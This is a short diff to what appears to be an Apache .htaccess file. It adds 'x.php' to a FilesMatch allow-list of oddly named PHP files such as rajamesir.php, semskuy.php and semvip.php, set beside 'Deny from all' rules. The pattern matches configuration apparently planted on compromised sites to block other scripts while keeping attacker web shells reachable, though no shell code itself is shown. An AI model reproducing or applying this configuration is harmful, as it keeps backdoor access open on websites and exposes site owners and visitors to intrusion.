@@ -62,7 +62,7 @@ Deny from all
     Order Deny,Allow
     Allow from all
 </FilesMatch>
-<FilesMatch "^(index.php|sam.php|apache.php|rajamesir.php|right-bar.php|gec11.php|wc.php|Rule_auth.php|en-GB.php|test.php|sc-manager.php|layout-sc.php|layout-bg.php|XXI-sup.php|samlong.php|semskuy.php|semvip.php|semjago.php|semgntg.php)$">
+<FilesMatch "^(index.php|x.php|sam.php|apache.php|rajamesir.php|right-bar.php|gec11.php|wc.php|Rule_auth.php|en-GB.php|test.php|sc-manager.php|layout-sc.php|layout-bg.php|XXI-sup.php|samlong.php|semskuy.php|semvip.php|semjago.php|semgntg.php)$">
  Order allow,deny
  Allow from all
 </FilesMatch>
